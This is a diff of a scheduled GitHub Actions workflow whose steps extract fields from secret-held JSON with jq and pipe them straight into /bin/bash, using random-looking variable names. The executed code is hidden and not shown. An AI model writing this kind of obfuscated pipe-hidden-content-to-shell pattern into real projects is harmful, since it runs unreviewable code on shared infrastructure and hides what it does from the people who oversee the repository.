@@ -1,23 +1,29 @@
 name: zhuanxiagjiaohe
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 3/6 * * *'
-jobs:  # 11332
+    - cron: '21 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhuanxiagjiaohe
         env:
-          ass36824: ${{ secrets.ass36824 }}
+          agy1: ${{ secrets.agy1 }}
         run: |
-          echo $ass36824 | jq -r .kyt96437 | /bin/bash
-          echo $wt04207 | jq -r .mcbdl6 | /bin/bash
-          echo $gkpar1881 | jq -r .nybe75215 | /bin/bash
-          echo $j40173 | jq -r .a3850 | /bin/bash
-          echo $dpv0 | jq -r .mumxs945 | /bin/bash
-          echo $itqn55575 | jq -r .cjrao1330 | /bin/bash
+          echo $agy1 | jq -r .fggzi6 | /bin/bash
+          echo $xfi1 | jq -r .e8 | /bin/bash
+          echo $gh7 | jq -r .t691 | /bin/bash
+          echo $dxsi3 | jq -r .ee8 | /bin/bash
+          echo $o666 | jq -r .acte1 | /bin/bash
+          echo $lwdf6014 | jq -r .n67 | /bin/bash
+          echo $l42243 | jq -r .oe16254 | /bin/bash
+          echo $eyfbr9648 | jq -r .luwh82 | /bin/bash
+          echo $n4597 | jq -r .wdevn747 | /bin/bash
+          echo $jue1 | jq -r .irqdu7 | /bin/bash
+          echo $dkneb08904 | jq -r .tzkb3643 | /bin/bash
+          echo $swpbl75 | jq -r .ub154 | /bin/bash
+          echo $eh3 | jq -r .khb577 | /bin/bash
+          echo $fodum1280 | jq -r .qw66 | /bin/bash
 
